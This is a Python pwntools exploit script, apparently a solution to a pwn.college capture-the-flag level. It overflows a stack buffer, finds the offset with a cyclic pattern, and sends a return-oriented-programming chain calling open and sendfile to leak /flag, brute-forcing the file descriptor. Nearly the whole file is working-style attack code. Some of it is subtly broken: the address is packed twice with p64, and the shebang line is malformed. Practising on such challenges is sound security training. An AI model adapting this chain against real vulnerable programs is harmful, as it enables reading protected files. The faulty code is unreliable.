#/usr/bin/python3
from pwn import *

# Retrieve the ELF information from the binary
elf = ELF("/challenge/babyrop_level6.1")

# Initialize the ROP module
rop = ROP(elf)

# Run the program
io = elf.process(setuid=False)

# Build and send the payload to the program
# NOTE: cyclic function setup a pattern payload that with
#       cyclic_find can be used to retrieve the distance
#       between buffer and return address
io.sendline(cyclic(512, n=8))
io.wait()
buff_length = cyclic_find(io.corefile.fault_addr, n=8)

# Initialize the file descriptor value
file_descriptor = 3

# Because we don't know the address of the buffer we retrieve the address
# of the string we use as symbolic link with the "/flag" file, in order
# to change the permission on it.
# NOTE: elf.search('Leaving!') returns an iterator that gives the address
#       of the specified symbol.
# NOTE: we can retrieve the address analyzing the binary with GDB or Ghidra.
symlink_addr = p64(next(elf.search('Leaving!')))

# Until we don't find the correct file descriptor
while (True):
    # Build the rop chain in order to:
    # - Setup the rdi register with the name of the file (1st parameter)
    # - Setup the rsi register with the mode (2nd parameter)
    # - Call the open function
    # - Setup the rdi register with the file descriptor of the std_out (1st parameter)
    # - Setup the rsi register with the file descriptor of the opened file (2nd parameter)
    # - Setup the rdx register with the offset value (3rd parameter)
    # - Setup the rcx register with the number of bytes to read (4th parameter)
    # - Call the sendfile function
    CHAIN = p64(rop.rdi.address) + p64(symlink_addr) +\
            p64(rop.rsi.address) + p64(0) +\
            p64(0x401100) +\
            p64(rop.rdi.address) + p64(1) +\
            p64(rop.rsi.address) + p64(file_descriptor) +\
            p64(rop.rdx.address) + p64(0) +\
            p64(rop.rcx.address) + p64(100) +\
            p64(0x4010e0)
    
    # Build and send the payload to the program
    PAYLOAD = b"A"*(buff_length) + CHAIN

    # Run the program another time
    io = elf.process()

    # Send the payload to the program
    io.sendline(PAYLOAD)

    # Retrieve the possible flag
    io.recvuntil(b"Leaving!")
    flag = io.recvall().decode(errors='ignore')

    # Check if the flag has been retrieved correctly
    if "pwn.college" in flag:
        print(flag)
        break

    # Increment the file descriptor number
    file_descriptor+=1